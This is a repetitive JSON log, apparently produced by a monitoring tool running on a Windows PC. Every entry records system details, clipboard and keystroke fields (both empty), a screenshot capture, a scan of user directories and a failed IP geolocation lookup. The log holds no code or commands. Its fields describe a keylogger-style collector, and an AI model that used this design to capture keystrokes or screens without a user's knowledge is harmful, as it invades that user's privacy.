{"timestamp": "2025-06-14T08:40:45.394303+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137390>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "1cc99ff2cf0d7db67654a267dee63671558e2665c2b9eea719d05cab199f35b4", "_raw_log_hash": "aae40028178f1f188b93ef447580f7dbab0fee2c7d7e74c8e716b0bc347967e1"}
{"timestamp": "2025-06-14T08:40:58.934487+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137ED0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "29e18b8ed64c42686b120c7c9316b146e1446ed7ec6f2c9ec2c2b961d92a7ca1", "_raw_log_hash": "563da893ffdd5a6b5ea62b249ab581a6e5609a8a574d7690e803f81a0b0849d0"}
{"timestamp": "2025-06-14T08:41:12.742200+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137B10>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "d38b2cb8715c5b02be1a24a9f6ed7d6958adb4b744bb30c71d5c908014a0ee3f", "_raw_log_hash": "ccb69cc197b57363d255f3c12fbcf94194741434057ed27d81f8c64001b0f6e2"}
{"timestamp": "2025-06-14T08:41:26.433226+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D1374D0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "8942dee6793da86b5a589aac0ad268ef72a12107502deeaf2f1b157d24742efe", "_raw_log_hash": "5be9cb9be525bebd7d2b5dcbff61c0cc47b5b490fc3a7031a041e5915f56d956"}
{"timestamp": "2025-06-14T08:41:40.110661+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137610>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "71ea1742688604c520ade54a3b337a2f081958c03bc378fbe3bc7e981759434a", "_raw_log_hash": "1e10e39e2eda75fe7c9572b9eee6a69dee0509c0801977521d5dcad15dfd47d2"}
{"timestamp": "2025-06-14T08:41:53.652246+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137890>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "e01a5fdccdb6488dfc8de951d4c2da6841c47731d50f0db60363f6023ea8641c", "_raw_log_hash": "5254733665838f5c5cfc377e5db0aa62a4fc243f11d0e1e2d7da00f1484aeb13"}
{"timestamp": "2025-06-14T08:42:07.200317+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D1379D0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "18ac8497cd16f3e7598267c9d180442b7f52c987026dea6e789187e5d7a851df", "_raw_log_hash": "4207fb5e734801a4a96604a825fce3a524fbf396902a82885d998c37462577ed"}
{"timestamp": "2025-06-14T08:42:20.824812+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137390>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "41c6314ab22ee2c5a22b2c8373bb4503f19933459b90bbd7bfb732963200f8dd", "_raw_log_hash": "d4d5cd2e913a62598dcb2f2bd0eb67dd3239744f1a90f9c5f9d79c5ddedcd6d7"}
{"timestamp": "2025-06-14T08:42:34.399156+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137750>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "cd336a60ea42f723ff96de5dd3be6b2efd6e61159327d611a41395126bd3c16b", "_raw_log_hash": "48496ab812705476bcba16c1dbbc070c60a03dfa4a203f359538b49b2d497d6f"}
{"timestamp": "2025-06-14T08:42:48.074937+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137B10>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "c21c8cab9b80f9336ad3a37eb85d1be2bbbe45875011e8e0b28091931576b69a", "_raw_log_hash": "046769e209165066fd307304120a369149848091881592c0c1de99a6edc80210"}
{"timestamp": "2025-06-14T08:43:01.545412+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137ED0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "6212d7985b23cd7da0ccac88b882b50f3bfb3bafcc8ed605cce0b776e24e2085", "_raw_log_hash": "3b57b9e8acee30b55279eae72aa266667320df1390efc8a8591e247f33d58a33"}
{"timestamp": "2025-06-14T08:43:15.145571+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137610>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "ae1b4de26f8a4e24a1544d0922a82eee800a9c4aa832f456c66dae1753109990", "_raw_log_hash": "d60f8aec354217c36a6b35d240424b7e58b97d2e92cd2ab6d0ab0bd414efec1e"}
{"timestamp": "2025-06-14T08:43:28.696752+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D1374D0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "012165213ceddb8463f9b526185ac201b8a625b44145486144ef5020c0d6f15a", "_raw_log_hash": "3e7418f1ef52c7f79bdde9f8fc55a9daa335264465186ad5b94d2f6f6c3ffffc"}
{"timestamp": "2025-06-14T08:43:42.406843+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D1379D0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "5cd9e949b8b1b08e9a65acf709412f4ded8cbd9c3383713c28b541e6a4363ced", "_raw_log_hash": "a1e5a54eaa5350bedf8a4829109990a410a81e4fa73ea2babfe0d915bd431d52"}
{"timestamp": "2025-06-14T08:43:55.934022+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137890>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "c8cf1fb9209d2b414690bdd5926f67da7c1b1dc3f854aaa9828ef318b2707d8d", "_raw_log_hash": "4e467e085b64b53bc1037da9c8668f97688a92d0359b611548e0362c7bab9b3b"}
{"timestamp": "2025-06-14T08:44:09.621455+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137750>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "7e7b54005f70b03fa767f1438ffc6f212d22f84e24fed043d0428de2a75d1932", "_raw_log_hash": "94014323c6ac46e32fadeff59704ebfd8ad0563b10505b5d1084b7641bcfbe11"}
{"timestamp": "2025-06-14T08:44:23.245397+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137390>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "ac86bce8d2ed49781edab54efbd031528a1f7491c71039e60381668336eca93a", "_raw_log_hash": "bff341f1435860deca9c0270132e1709c8e1c3aa45358b729d21540e23ca99cb"}
{"timestamp": "2025-06-14T08:44:36.906108+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137ED0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "c15859de843af4d91575d273c746271c24cbb7dafb7c5d9518ab22001b2e8cc7", "_raw_log_hash": "ee24fc1aee285c2d4782c8d473172be0662cb97f321dc205857cc39f0cb85331"}
{"timestamp": "2025-06-14T08:44:50.482841+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137B10>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "1d7ec03ddfaaae9d841e69cf64c379f5b7eff5b8aa81e09893737adf80960c55", "_raw_log_hash": "d70eafa08008a5a84d92b5139a3bfd7156e30c1d92ac7fffcb533d31742acb35"}
{"timestamp": "2025-06-14T08:45:04.130174+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D1374D0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "eac3e2cee9880e6ca2ad75d02e90fed8e1e5e78ce27d2d7aff60266b46f5bcfd", "_raw_log_hash": "ddf03d77576b34d2b23e24a9ccfb948427020725b3136f4568b8e01928a3d48f"}
{"timestamp": "2025-06-14T08:45:17.682879+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137610>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "35b3c77aa9a0012cf66a58c413ac0ced0c887963175f25ac2c33db864458feff", "_raw_log_hash": "eb210d7e61f9268a843c0a2180f90004cd10da83bacce817eab69237c920f8e8"}
{"timestamp": "2025-06-14T08:45:31.312668+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137890>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "909133d8c30284c2c3c2e642a12da963cfd3f7fc9365c105cd854614e2e0ba9d", "_raw_log_hash": "0e35fcc7180c48685eec07dd80cfdb1710ef150cec04959ee627f045e1450756"}
{"timestamp": "2025-06-14T08:45:44.926972+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D1379D0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "12886783a1684dc0eb622e2730176d9d19636ef35b4abc92260dbd2210fdaf20", "_raw_log_hash": "25d575b18d06d2a7342bbc07828eee60ff7e3b6b3301f6f01ac5d4832d582436"}
{"timestamp": "2025-06-14T08:45:58.691848+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137390>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "8ad013373fad5d6e28a59d6cd37f1e3b9a7ae82bf0162196cbc8ff51840e0deb", "_raw_log_hash": "0519f91e95fc357918b08da53c4302a13ba995a6b8ab927677205e7222e134e5"}
{"timestamp": "2025-06-14T08:46:12.313076+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137750>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "ed958bb5891e765ef62ae4f93872ff0a8bf055ea8a00a423e80e65e9d446d12d", "_raw_log_hash": "ea394797e2030b1475cc30d251495874850ef5a015857938ba2f06998803308a"}
{"timestamp": "2025-06-14T08:46:26.205824+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137B10>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "d814d90dbb70e5b835088cc8095eecac7544ecfedca6b84875523eab5bf3bbe3", "_raw_log_hash": "f5caf355cdf403b05c07a9e521e326858890ca2f3a398c5ebc2e0a4ecb84a14f"}
